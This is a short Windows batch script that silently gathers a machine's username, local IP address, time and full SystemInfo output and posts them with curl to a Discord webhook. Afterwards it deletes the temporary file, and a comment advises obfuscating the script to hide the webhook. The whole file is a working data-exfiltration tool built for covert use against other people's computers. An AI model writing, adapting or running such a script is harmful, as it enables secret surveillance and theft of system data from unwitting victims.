@echo off
:: Remember that obfuscating the batch will help hide your webhook!
set "webhook=https://discord.com/api/webhooks/"
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (set HH24=%%a & set MI=%%b & set SS=%%c)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %NetworkIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
	set tempsys=%appdata%\sysinfo.txt
	2>NUL SystemInfo > %tempsys%
	curl --silent --output /dev/null -F systeminfo=@%tempsys% %webhook%
	del %tempsys%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[End of report]```\"}"  %webhook%
exit
